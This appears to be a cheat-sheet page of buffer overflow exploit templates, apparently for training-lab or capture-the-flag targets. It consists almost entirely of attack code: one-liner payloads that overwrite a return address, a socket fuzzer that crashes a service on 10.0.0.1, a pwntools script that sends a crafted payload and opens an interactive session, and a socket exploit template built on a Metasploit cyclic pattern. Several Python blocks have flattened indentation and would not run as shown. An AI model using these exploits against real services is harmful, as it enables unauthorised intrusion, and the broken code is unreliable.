---
title: Buffer Overflow Attack
desc: An anomaly where a program, while writing data to a buffer, overruns the buffer's boundary and overwrites adjacent memory locations.
tags: [Buffer Overflow, Python, Reverse Engineering]
alts: [Reverse-Engineering]
render_with_liquid: false
---

## 1. Python Payload

```python
python3 -c 'print("A" * 32 + "B" * 8 + "C" * 8)'
python3 -c 'print("A" * 32 + "BBBBBBBB" + "\x86\x06\x40\x00\x00\x00\x00\x00")'
# Copy the output string

# Paste the specific field when executing
./example.so
```

<br />

## 2. Check to Crash

1. Creating a Fuzzer using Python

    *fuzzer.py*

    ```python
    #!/usr/bin/env python3

    import socket, time, sys

    ip = "10.0.0.1"

    port = 1337
    timeout = 5
    prefix = "OVERFLOW1 "

    string = prefix + "A" * 100

    while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
        s.send(bytes(string, "latin-1"))
        s.recv(1024)
    except:
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    string += 100 * "A"
    time.sleep(1)
    ```

2. Executing Script

    ```sh
    python3 fuzzer.py
    ```

<br />

## 3. Scanf in Object File

Using **[Pwntools](https://github.com/Gallopsled/pwntools)** with Python.

```python
from pwn import *

# target ip address
host = "10.0.0.1"
# target port
port = 5700

context(terminal = ['tmux', 'new-window'])
# set target executable
binary = context.binary = ELF("./example.so")
context(os = "linux", arch = "amd64")

connect = remote(host, port)
log.info("[+] Starting bufer overflow")
# set the executable output
connect.recvuntil(b"What's your name: ")
log.info("[+] Crafting payload")

payload = b'A' * 40
payload += p64(0x00400686)
log.info("[+] Sending Payload to the remote server")
# Send payload
connect.sendline(payload)
connect.interactive()
```

<br />

## 4. Socket

1. **Generate a cyclic pattern**

    ```sh
    # ex. 2000 bytes
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
    ```

    Copy the output string.

2. **Create the Exploit**

    Paste the copied strings (the above cyclic pattern) to the “payload” variable.

    ```python
    import socket

    ip = "10.0.0.1"
    port = 1337

    prefix = "OVERFLOW1 "
    offset = 0
    overflow = "A" * offset
    retn = ""
    padding = ""
    payload = "<PASTE_A_CYCLIC_PATTERN>"
    postfix = ""

    buffer = prefix + overflow + retn + padding + payload + postfix

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
    except:
    print("Could not connect.")
    ```
